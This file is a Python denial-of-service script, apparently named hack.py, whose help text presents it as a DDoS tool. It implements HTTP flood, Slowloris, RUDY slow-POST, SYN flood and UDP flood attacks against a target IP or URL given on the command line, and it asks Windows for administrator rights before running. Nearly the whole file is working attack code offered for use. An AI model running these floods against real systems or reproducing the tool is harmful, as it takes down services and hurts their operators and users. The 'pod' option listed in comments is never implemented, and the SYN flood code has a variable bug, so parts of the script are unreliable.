import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import warnings
warnings.filterwarnings("ignore", message="No libpcap provider available! pcap won't be used")

import sys, socket, requests, time, os, ctypes, random
from scapy.all import IP, TCP, send

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def httpf(ip):
    print(f"attack on {ip}")
    while True:
        response = requests.get(ip)

def slowloris(ip, port, num_connections):
    print(f"attack on {ip}")
    connections = []
    for _ in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            connections.append(s)
        except socket.error:
            pass
    
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Accept-language: en-US,en,q=0.5",
        "Connection: keep-alive"
    ]
    headers_str = "\r\n".join(headers)

    # Send headers to server very slowly
    while True:
        for conn in connections:
            try:
                conn.sendall(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                conn.sendall(headers_str.encode())
                time.sleep(random.uniform(10, 20))  # Sleep randomly between 10 to 20 seconds
            except socket.error:
                pass
    

def rudy(ip, port):
    print(f"attack on {ip}")
    payload = "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 1000000\r\n" + \
          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" + \
          "&" * 1000000

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        s.sendall(payload.encode())
        
        time.sleep(30)

def synf(ip, port):
    print(f"attack on {ip}")
    while True:
        ip = IP(dst=ip)
        tcp = TCP(dport=port, flags='S')
        packet = ip/tcp 
        send(packet)

def udpf(ip, port):
    print(f"attack on {ip}")
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    while True:
        client.sendto(bytes, (ip, port))

if __name__ == "__main__":
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(sys.argv), None, 1
            )
        except Exception as e:
            sys.exit(1)


    args = sys.argv

    if len(args)-1 == 1:
        attack_type = args[1] # types : { httpf, rudy, pod, synf, udpf, help }
   
    elif len(args)-1 == 2:
        attack_type = args[1] # types : { httpf, rudy, pod, synf, udpf, help }
        target_ip = args[2] # ip of target
   
    elif len(args)-1 == 3:
        attack_type = args[1] # types : {, httpf, rudy, pod, synf, udpf, help }
        target_ip = args[2] # ip of target
        target_port = int(args[3]) # port of target

    if attack_type == "help": # help page
        print("It is tool what help ddos-attack")
        print()
        print("How to use")
        print("python hack.py [ Type ] [ URL(for httpf) | IP(other than httpf) ] [ Port ]")
        print()
        print("Type")
        print("1. httpf( HTTP Flood ) : An attack that exhausts a web server's resources by sending a large number of HTTP requests.")
        print("2. hsl( HTTP Slowloris ) : It ensures connectivity to the web server by sending HTTP headers at a very aggressive rate while maintaining server-relational connectivity.")
        print("3. rudy( RUDY ) : An attack that exhausts server resources by sending POST requests very slowly.")
        print("4. synf( SYN Flooding ) : An attack that exhausts server resources by sending a large number of TCP connection request packets (SYN packets).")
        print("5. udpf( UDP Flooding ) : An attack that exhausts network bandwidth by sending large amounts of UDP packets to the target server.")
        print("6. help( Help page ) : Help page. When using help, you do not need to enter IP and port.")
        print()
        print("IP")
        print("Ip of target")
        print("HTTP Flood does not accept this argument.")
        print()
        print("URL")
        print("URL of target")
        print("Except for HTTP Flood, all others do not accept this argument.")
        print()
        print("Port")
        print("Port of target")
        print("HTTP Flood does not accept this argument.")
        print()
        print()

    if attack_type=="hsl": slowloris(target_ip, target_port, 100)
    if attack_type=="httpf": httpf(target_ip)
    if attack_type=="rudy": rudy(target_ip, target_port)
    if attack_type=="synf": synf(target_ip, target_port)
    if attack_type=="udpf": udpf(target_ip, target_port)

